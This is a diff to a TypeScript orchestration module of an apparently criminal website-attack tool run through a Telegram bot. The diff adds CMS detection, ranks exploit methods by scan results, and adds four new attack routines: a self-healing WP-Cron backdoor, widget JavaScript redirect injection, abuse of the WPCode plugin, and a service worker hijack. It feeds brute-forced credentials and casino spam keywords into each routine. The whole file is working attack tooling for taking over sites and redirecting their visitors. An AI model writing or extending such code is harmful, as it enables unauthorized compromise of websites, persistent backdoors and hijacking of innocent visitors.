@@ -3814,37 +3814,77 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         phase: "exploit" | "inject" | "hijack";
         icon: string;
         keywords: string[]; // keywords to match from attackVector name/technique
+        cms: string[]; // compatible CMS types, "*" = universal
       };
       const ALL_METHODS: AttackMethodDef[] = [
         // WP-specific methods
-        { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"] },
-        { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"] },
-        { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"] },
-        { id: "db_siteurl", name: "DB siteurl/home Hijack", phase: "hijack", icon: "🗄️", keywords: ["siteurl", "home", "wp_options", "database", "db_option", "option_value"] },
-        { id: "gtm_inject", name: "GTM Redirect Inject", phase: "inject", icon: "🏷️", keywords: ["gtm", "tag manager", "google tag", "analytics", "header inject", "footer inject", "wpcode"] },
-        { id: "auto_prepend", name: "auto_prepend .user.ini", phase: "inject", icon: "⚙️", keywords: ["user.ini", "auto_prepend", "php.ini", "prepend_file", "php_value", "php-fpm"] },
-        { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"] },
-        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"] },
-        { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"] },
+        { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"], cms: ["wordpress", "*"] },
+        { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"], cms: ["wordpress"] },
+        { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"], cms: ["wordpress"] },
+        { id: "db_siteurl", name: "DB siteurl/home Hijack", phase: "hijack", icon: "🗄️", keywords: ["siteurl", "home", "wp_options", "database", "db_option", "option_value"], cms: ["wordpress"] },
+        { id: "gtm_inject", name: "GTM Redirect Inject", phase: "inject", icon: "🏷️", keywords: ["gtm", "tag manager", "google tag", "analytics", "header inject", "footer inject", "wpcode"], cms: ["wordpress"] },
+        { id: "auto_prepend", name: "auto_prepend .user.ini", phase: "inject", icon: "⚙️", keywords: ["user.ini", "auto_prepend", "php.ini", "prepend_file", "php_value", "php-fpm"], cms: ["wordpress", "joomla", "drupal", "magento", "custom", "*"] },
+        { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"], cms: ["wordpress", "*"] },
+        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"], cms: ["wordpress"] },
+        { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"], cms: ["*"] },
+        // Priority 2 WP methods
+        { id: "wp_cron", name: "WP-Cron Backdoor", phase: "inject", icon: "⏰", keywords: ["cron", "wp-cron", "scheduled", "self-healing", "persistent"], cms: ["wordpress"] },
+        { id: "widget_inject", name: "Widget/Sidebar Inject", phase: "inject", icon: "🧱", keywords: ["widget", "sidebar", "widget_text", "custom_html", "widget_block"], cms: ["wordpress"] },
+        { id: "wpcode_abuse", name: "WPCode Plugin Abuse", phase: "inject", icon: "📝", keywords: ["wpcode", "insert headers", "code snippets", "header footer", "ihaf"], cms: ["wordpress"] },
+        { id: "service_worker", name: "Service Worker Hijack", phase: "inject", icon: "🛡️", keywords: ["service worker", "sw.js", "cache", "intercept", "pwa"], cms: ["*"] },
         // Non-WP CMS methods
-        { id: "joomla", name: "Joomla Exploits", phase: "exploit", icon: "🔴", keywords: ["joomla", "com_fields", "com_content", "com_users", "joomla template", "joomla api"] },
-        { id: "drupal", name: "Drupal Exploits", phase: "exploit", icon: "🔵", keywords: ["drupal", "drupalgeddon", "drupal theme", "drupal module", "node/1"] },
-        { id: "cpanel_full", name: "cPanel Full Control", phase: "hijack", icon: "🖥️", keywords: ["cpanel", "whm", "file manager", "zone editor", "cron", "cpanel_api", "2083"] },
-        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"] },
-        { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"] },
-        { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"] },
+        { id: "joomla", name: "Joomla Exploits", phase: "exploit", icon: "🔴", keywords: ["joomla", "com_fields", "com_content", "com_users", "joomla template", "joomla api"], cms: ["joomla"] },
+        { id: "drupal", name: "Drupal Exploits", phase: "exploit", icon: "🔵", keywords: ["drupal", "drupalgeddon", "drupal theme", "drupal module", "node/1"], cms: ["drupal"] },
+        { id: "cpanel_full", name: "cPanel Full Control", phase: "hijack", icon: "🖥️", keywords: ["cpanel", "whm", "file manager", "zone editor", "cron", "cpanel_api", "2083"], cms: ["*"] },
+        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"], cms: ["custom", "unknown"] },
+        { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"], cms: ["*"] },
+        { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"], cms: ["custom", "unknown"] },
       ];
+      
+      // ── Smart CMS Detection ──
+      const detectedCms = (() => {
+        if (vulnScanResult) {
+          const cmsType = vulnScanResult.cms?.type || "unknown";
+          if (cmsType === "wordpress") return "wordpress";
+          if (cmsType === "joomla") return "joomla";
+          if (cmsType === "drupal") return "drupal";
+          if (cmsType === "magento") return "magento";
+          // Check for Laravel/IIS from server info
+          const poweredBy = (vulnScanResult.serverInfo?.poweredBy || "").toLowerCase();
+          if (poweredBy.includes("laravel")) return "laravel";
+          const serverStr = (vulnScanResult.serverInfo?.server || "").toLowerCase();
+          if (serverStr.includes("microsoft-iis")) return "iis";
+          if (cmsType !== "unknown" && cmsType !== "custom" && cmsType !== "static") return cmsType;
+        }
+        return "unknown";
+      })();
+      
+      // Filter methods by CMS compatibility
+      const compatibleMethods = ALL_METHODS.filter(m => {
+        if (m.cms.includes("*")) return true; // universal method
+        if (m.cms.includes(detectedCms)) return true; // exact CMS match
+        if (detectedCms === "unknown" && (m.cms.includes("custom") || m.cms.includes("unknown"))) return true;
+        return false;
+      });
+      
+      const skippedMethods = ALL_METHODS.filter(m => !compatibleMethods.includes(m));
+      
+      await narrator.addAnalysis(
+        `\uD83D\uDD0D CMS \u0E17\u0E35\u0E48\u0E15\u0E23\u0E27\u0E08\u0E1E\u0E1A: **${detectedCms === "unknown" ? "\u0E44\u0E21\u0E48\u0E17\u0E23\u0E32\u0E1A CMS" : detectedCms.toUpperCase()}**\n` +
+        `\u2705 \u0E27\u0E34\u0E18\u0E35\u0E17\u0E35\u0E48\u0E43\u0E0A\u0E49\u0E44\u0E14\u0E49: ${compatibleMethods.length} \u0E27\u0E34\u0E18\u0E35` +
+        (skippedMethods.length > 0 ? `\n\u23ED\uFE0F Skip ${skippedMethods.length} \u0E27\u0E34\u0E18\u0E35\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E40\u0E01\u0E35\u0E48\u0E22\u0E27\u0E02\u0E49\u0E2D\u0E07: ${skippedMethods.map(m => m.name).join(", ")}` : "")
+      );
       
       // Build dynamic order from scan results
       let methodOrder: string[] = [];
       if (vulnScanResult && vulnScanResult.attackVectors.length > 0) {
         // Score each method based on matching attackVectors
         const methodScores = new Map<string, number>();
-        for (const m of ALL_METHODS) methodScores.set(m.id, 0);
+        for (const m of compatibleMethods) methodScores.set(m.id, 0);
         
         for (const vec of vulnScanResult.attackVectors) {
           const vecText = `${vec.name} ${vec.technique} ${vec.method} ${vec.payloadType}`.toLowerCase();
-          for (const m of ALL_METHODS) {
+          for (const m of compatibleMethods) {
             for (const kw of m.keywords) {
               if (vecText.includes(kw)) {
                 methodScores.set(m.id, (methodScores.get(m.id) || 0) + vec.successProbability);
@@ -3854,24 +3894,25 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           }
         }
         
-        // Sort by score descending, keep all methods
-        methodOrder = ALL_METHODS
+        // Sort by score descending, keep compatible methods only
+        methodOrder = compatibleMethods
           .map(m => ({ id: m.id, score: methodScores.get(m.id) || 0 }))
           .sort((a, b) => b.score - a.score)
           .map(m => m.id);
         
         await narrator.addAnalysis(
-          `🧠 AI จัดลำดับโจมตีตามผล scan:\n` +
+          `\uD83E\uDDE0 AI \u0E08\u0E31\u0E14\u0E25\u0E33\u0E14\u0E31\u0E1A\u0E42\u0E08\u0E21\u0E15\u0E35\u0E15\u0E32\u0E21\u0E1C\u0E25 scan (${detectedCms.toUpperCase()}):\n` +
           methodOrder.map((id, i) => {
-            const m = ALL_METHODS.find(x => x.id === id)!;
+            const m = compatibleMethods.find(x => x.id === id)!;
             const score = methodScores.get(id) || 0;
             return `${i + 1}. ${m.icon} ${m.name} (score: ${score.toFixed(1)})`;
           }).join("\n")
         );
       } else {
-        // Fallback: fixed order
-        methodOrder = ["pipeline", "cloaking", "mu_plugins", "db_siteurl", "gtm_inject", "auto_prepend", "hijack", "advanced", "redirect", "joomla", "drupal", "cpanel_full", "iis_aspnet", "open_redirect", "laravel_inject"];
-        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → MU-Plugins → DB Hijack → GTM → auto_prepend → Hijack → Advanced → Redirect → Joomla → Drupal → cPanel → IIS → Open Redirect → Laravel`);
+        // Fallback: fixed order based on CMS
+        const allIds = compatibleMethods.map(m => m.id);
+        methodOrder = allIds;
+        await narrator.addAnalysis(`\u26A0\uFE0F \u0E44\u0E21\u0E48\u0E21\u0E35\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25 scan \u2014 \u0E43\u0E0A\u0E49\u0E25\u0E33\u0E14\u0E31\u0E1A\u0E40\u0E23\u0E34\u0E48\u0E21\u0E15\u0E49\u0E19 (${compatibleMethods.length} \u0E27\u0E34\u0E18\u0E35\u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A ${detectedCms.toUpperCase()})`);
       }
       
       // Execute methods in AI-determined order
@@ -4349,6 +4390,142 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               failedMethods.push(`Open Redirect`);
               await narrator.addAnalysis(`❌ ไม่พบ Open Redirect endpoints`);
             }
+          } else if (methodId === "wp_cron") {
+            // ── WP-Cron Backdoor (self-healing redirect) ──
+            const { wpCronBackdoor } = await import("./shellless-attack-engine");
+            const cronStep = await narrator.addStep("⏰ WP-Cron Backdoor (self-healing)");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              discoveredCredentials: vulnScanResult?.attackVectors
+                ?.filter((v: any) => v.technique?.toLowerCase().includes("credential") || v.technique?.toLowerCase().includes("brute"))
+                ?.map((v: any) => ({ type: "wordpress", username: v.username || "admin", password: v.password || "" })) || [],
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const cronResult = await wpCronBackdoor(shelllessConfig);
+            
+            if (cronResult.success && cronResult.redirectWorks) {
+              fullChainSuccess = true;
+              successMethod = "WP-Cron Backdoor";
+              successUrl = cronResult.injectedUrl || "";
+              await narrator.updateStep(cronStep, "done", `✅ ${cronResult.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ WP-Cron backdoor สำเร็จ! Self-healing: ถ้าลบไฟล์ cron จะ re-inject ทุกชั่วโมง`);
+            } else {
+              failedMethods.push(`WP-Cron (${cronResult.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(cronStep, "failed", cronResult.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ WP-Cron backdoor ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "widget_inject") {
+            // ── Widget/Sidebar JS Redirect Inject ──
+            const { widgetSidebarInject } = await import("./shellless-attack-engine");
+            const widgetStep = await narrator.addStep("🧱 Widget/Sidebar JS Inject");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              discoveredCredentials: vulnScanResult?.attackVectors
+                ?.filter((v: any) => v.technique?.toLowerCase().includes("credential") || v.technique?.toLowerCase().includes("brute"))
+                ?.map((v: any) => ({ type: "wordpress", username: v.username || "admin", password: v.password || "" })) || [],
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const widgetResult = await widgetSidebarInject(shelllessConfig);
+            
+            if (widgetResult.success && widgetResult.redirectWorks) {
+              fullChainSuccess = true;
+              successMethod = "Widget/Sidebar Inject";
+              successUrl = widgetResult.injectedUrl || "";
+              await narrator.updateStep(widgetStep, "done", `✅ ${widgetResult.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ Widget JS redirect inject สำเร็จ! JS redirect ใน sidebar ทุกหน้า`);
+            } else {
+              failedMethods.push(`Widget (${widgetResult.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(widgetStep, "failed", widgetResult.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ Widget inject ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "wpcode_abuse") {
+            // ── WPCode / Insert Headers & Footers Plugin Abuse ──
+            const { wpcodePluginAbuse } = await import("./shellless-attack-engine");
+            const wpcodeStep = await narrator.addStep("📝 WPCode/IHAF Plugin Abuse");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              discoveredCredentials: vulnScanResult?.attackVectors
+                ?.filter((v: any) => v.technique?.toLowerCase().includes("credential") || v.technique?.toLowerCase().includes("brute"))
+                ?.map((v: any) => ({ type: "wordpress", username: v.username || "admin", password: v.password || "" })) || [],
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const wpcodeResult = await wpcodePluginAbuse(shelllessConfig);
+            
+            if (wpcodeResult.success && wpcodeResult.redirectWorks) {
+              fullChainSuccess = true;
+              successMethod = "WPCode Plugin Abuse";
+              successUrl = wpcodeResult.injectedUrl || "";
+              await narrator.updateStep(wpcodeStep, "done", `✅ ${wpcodeResult.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ WPCode/IHAF inject สำเร็จ! JS redirect ผ่าน DB options — ไม่แก้ไขไฟล์`);
+            } else {
+              failedMethods.push(`WPCode (${wpcodeResult.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(wpcodeStep, "failed", wpcodeResult.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ WPCode/IHAF inject ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "service_worker") {
+            // ── Service Worker Hijack (browser-level intercept) ──
+            const { serviceWorkerHijack } = await import("./shellless-attack-engine");
+            const swStep = await narrator.addStep("🛡️ Service Worker Hijack");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              discoveredCredentials: vulnScanResult?.attackVectors
+                ?.filter((v: any) => v.technique?.toLowerCase().includes("credential") || v.technique?.toLowerCase().includes("brute"))
+                ?.map((v: any) => ({ type: "wordpress", username: v.username || "admin", password: v.password || "" })) || [],
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const swResult = await serviceWorkerHijack(shelllessConfig);
+            
+            if (swResult.success && swResult.redirectWorks) {
+              fullChainSuccess = true;
+              successMethod = "Service Worker Hijack";
+              successUrl = swResult.injectedUrl || "";
+              await narrator.updateStep(swStep, "done", `✅ ${swResult.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ Service Worker hijack สำเร็จ! Browser-level intercept — redirect ทุก navigation request`);
+            } else {
+              failedMethods.push(`Service Worker (${swResult.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(swStep, "failed", swResult.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ Service Worker hijack ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
           } else if (methodId === "laravel_inject") {
             // ── Laravel Redirect Inject ──
             await narrator.addStep("🟥 Laravel .env + Ignition RCE");
